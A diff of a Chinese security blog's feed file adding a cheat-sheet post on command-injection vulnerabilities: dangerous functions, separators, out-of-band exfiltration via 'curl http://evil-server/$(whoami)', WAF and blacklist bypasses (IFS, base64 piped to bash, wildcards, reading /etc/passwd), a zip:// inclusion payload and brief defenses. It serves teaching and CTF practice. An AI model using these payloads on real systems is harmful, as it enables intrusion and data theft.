-<h1 id="无回显注入"><a href="#无回显注入" class="headerlink" title="无回显注入"></a>无回显注入</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash反弹shell</span><br><span class="line">DNS外带数据</span><br><span class="line">http带外：</span><br><span class="line">          curl http://evil-server/$(whoami)</span><br><span class="line">          wget http://evil-server/$(whoami)</span><br><span class="line">无带外时利用sleep或其他逻辑构成bool条件</span><br></pre></td></tr></table></figure>
-
-<h1 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; &gt; &lt;&gt;符号 cat&lt;123</span><br><span class="line">\t</span><br><span class="line">$&#123;IFS&#125;其中&#123;&#125;用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell系统进程的第九个参的持有者，它始终为空字符串。</span><br><span class="line">$IFS$9</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.php&#125; //逗号实现空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
-
-<p>liunx绕开空格</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat%09flag</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">ca\t fl\ag</span><br></pre></td></tr></table></figure>
-
-<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=l;b=s;$s$b //拼接</span><br><span class="line">当cat flag被过滤时：</span><br><span class="line">a=c;b=at;c=f;d=lag;$a$b $&#123;c&#125;$&#123;d&#125;</span><br><span class="line"></span><br><span class="line">base64 echo &quot;bHM&quot;= | base64 -d //base64编码</span><br><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash (在bash被过滤的情况下可尝试sh)</span><br><span class="line"></span><br><span class="line">/?in/?s &gt; /bin/ls</span><br><span class="line">未定义的初始化变量 cat$4 /etc/passwd</span><br><span class="line"></span><br><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag //单双引号</span><br><span class="line"></span><br><span class="line">c\at fl\ag //反斜线</span><br><span class="line"></span><br><span class="line">正则 (假设/bin/cat: test: 是一个目录)</span><br><span class="line">/???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line">/???/?at ????</span><br><span class="line">/???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">$# 是传给脚本的参数个数</span><br><span class="line">$0 是脚本本身的名字</span><br><span class="line">$1 是传递给该shell脚本的第一个参数</span><br><span class="line">$2 是传递给该shell脚本的第二个参数</span><br><span class="line">$@ 是传给脚本的所有参数的列表</span><br><span class="line">$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</span><br><span class="line">$$ 是脚本运行的当前进程ID号</span><br><span class="line">$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</span><br></pre></td></tr></table></figure>
-
-<h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;wget\</span><br><span class="line">&gt;foo.\</span><br><span class="line">&gt;com</span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
-
-<p>上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件</p>
-<h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容  </span><br><span class="line">less:与 more 类似  </span><br><span class="line">head:查看头几行  </span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示  </span><br><span class="line">tail:查看尾几行  </span><br><span class="line">nl：显示的时候，顺便输出行号  </span><br><span class="line">od:以二进制的方式读取档案内容  </span><br><span class="line">vi:一种编辑器，这个也可以查看  </span><br><span class="line">vim:一种编辑器，这个也可以查看  </span><br><span class="line">sort:可以查看  </span><br><span class="line">uniq:可以查看  </span><br><span class="line">file -f:报错出具体内容  </span><br><span class="line">grep  </span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：  </span><br><span class="line">grep test *file  </span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
-
-<h1 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h1><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a 换行符，需要php环境</span><br><span class="line">%0d 回车符，需要php环境</span><br><span class="line">\n </span><br><span class="line">\r</span><br><span class="line">; 在 shell 中，是”连续指令”，这个与下面的`|`作用类似</span><br><span class="line">| （就是按位或），直接执行|后面的语句</span><br><span class="line">|| （就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp; （就是按位与），&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; （就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
-
-<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 0到无穷个任意字符</span><br><span class="line">? 一个任意字符</span><br><span class="line">[ ] 一个在括号内的字符，e.g. [abcd]</span><br><span class="line">[ - ] 在编码顺序内的所有字符</span><br><span class="line">[^ ] 一个不在括号内的字符</span><br></pre></td></tr></table></figure>
-
-<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不使用时禁用相应函数</span><br><span class="line">尽量不要执行外部的应用程序或命令</span><br><span class="line">做输入的格式检查</span><br><span class="line">转义命令中的所有shell元字符</span><br><span class="line">                shell元字符包括 #&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>漏洞利用</tag>
       </tags>
   </entry>
   <entry>
@@ -690,6 +1517,51 @@
 <p>注意：在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 <strong>#</strong> 在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
 <p><strong>Exp：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/index.php?filename=zip://shell.png%23shell.php</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>漏洞利用</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>命令执行漏洞</title>
+    <url>/posts/a43e8dc0.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>漏洞源因</strong></p>
+<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>即web服务页面中可以执行系统性命令或函数，导致系统的信息泄露。</p>
+<h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">shell_exec() = ``</span><br><span class="line">popen()</span><br><span class="line">peoc()</span><br><span class="line">proc_opne()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
+
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">popen()</span><br><span class="line">subprocess.call()</span><br><span class="line">spawn()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java.lang.Runtime.getRuntime().exec(command)</span><br></pre></td></tr></table></figure>
+
+<h1 id="常见注入方式"><a href="#常见注入方式" class="headerlink" title="常见注入方式"></a>常见注入方式</h1><p>windows</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|| &amp;&amp; &amp; 分隔</span><br><span class="line">\r\n %d0%d0 换行</span><br><span class="line">反引号解析</span><br><span class="line">$() 替换</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+
+<p>Linux下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分号分隔</span><br><span class="line">;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+
+<h1 id="无回显注入"><a href="#无回显注入" class="headerlink" title="无回显注入"></a>无回显注入</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash反弹shell</span><br><span class="line">DNS外带数据</span><br><span class="line">http带外：</span><br><span class="line">          curl http://evil-server/$(whoami)</span><br><span class="line">          wget http://evil-server/$(whoami)</span><br><span class="line">无带外时利用sleep或其他逻辑构成bool条件</span><br></pre></td></tr></table></figure>
+
+<h1 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; &gt; &lt;&gt;符号 cat&lt;123</span><br><span class="line">\t</span><br><span class="line">$&#123;IFS&#125;其中&#123;&#125;用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell系统进程的第九个参的持有者，它始终为空字符串。</span><br><span class="line">$IFS$9</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.php&#125; //逗号实现空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
+
+<p>liunx绕开空格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat%09flag</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">ca\t fl\ag</span><br></pre></td></tr></table></figure>
+
+<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=l;b=s;$s$b //拼接</span><br><span class="line">当cat flag被过滤时：</span><br><span class="line">a=c;b=at;c=f;d=lag;$a$b $&#123;c&#125;$&#123;d&#125;</span><br><span class="line"></span><br><span class="line">base64 echo &quot;bHM&quot;= | base64 -d //base64编码</span><br><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash (在bash被过滤的情况下可尝试sh)</span><br><span class="line"></span><br><span class="line">/?in/?s &gt; /bin/ls</span><br><span class="line">未定义的初始化变量 cat$4 /etc/passwd</span><br><span class="line"></span><br><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag //单双引号</span><br><span class="line"></span><br><span class="line">c\at fl\ag //反斜线</span><br><span class="line"></span><br><span class="line">正则 (假设/bin/cat: test: 是一个目录)</span><br><span class="line">/???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line">/???/?at ????</span><br><span class="line">/???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">$# 是传给脚本的参数个数</span><br><span class="line">$0 是脚本本身的名字</span><br><span class="line">$1 是传递给该shell脚本的第一个参数</span><br><span class="line">$2 是传递给该shell脚本的第二个参数</span><br><span class="line">$@ 是传给脚本的所有参数的列表</span><br><span class="line">$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</span><br><span class="line">$$ 是脚本运行的当前进程ID号</span><br><span class="line">$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</span><br></pre></td></tr></table></figure>
+
+<h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;wget\</span><br><span class="line">&gt;foo.\</span><br><span class="line">&gt;com</span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
+
+<p>上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件</p>
+<h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容  </span><br><span class="line">less:与 more 类似  </span><br><span class="line">head:查看头几行  </span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示  </span><br><span class="line">tail:查看尾几行  </span><br><span class="line">nl：显示的时候，顺便输出行号  </span><br><span class="line">od:以二进制的方式读取档案内容  </span><br><span class="line">vi:一种编辑器，这个也可以查看  </span><br><span class="line">vim:一种编辑器，这个也可以查看  </span><br><span class="line">sort:可以查看  </span><br><span class="line">uniq:可以查看  </span><br><span class="line">file -f:报错出具体内容  </span><br><span class="line">grep  </span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：  </span><br><span class="line">grep test *file  </span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
+
+<h1 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h1><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a 换行符，需要php环境</span><br><span class="line">%0d 回车符，需要php环境</span><br><span class="line">\n </span><br><span class="line">\r</span><br><span class="line">; 在 shell 中，是”连续指令”，这个与下面的`|`作用类似</span><br><span class="line">| （就是按位或），直接执行|后面的语句</span><br><span class="line">|| （就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp; （就是按位与），&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; （就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+
+<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 0到无穷个任意字符</span><br><span class="line">? 一个任意字符</span><br><span class="line">[ ] 一个在括号内的字符，e.g. [abcd]</span><br><span class="line">[ - ] 在编码顺序内的所有字符</span><br><span class="line">[^ ] 一个不在括号内的字符</span><br></pre></td></tr></table></figure>
+
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不使用时禁用相应函数</span><br><span class="line">尽量不要执行外部的应用程序或命令</span><br><span class="line">做输入的格式检查</span><br><span class="line">转义命令中的所有shell元字符</span><br><span class="line">                shell元字符包括 #&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>web渗透</category>
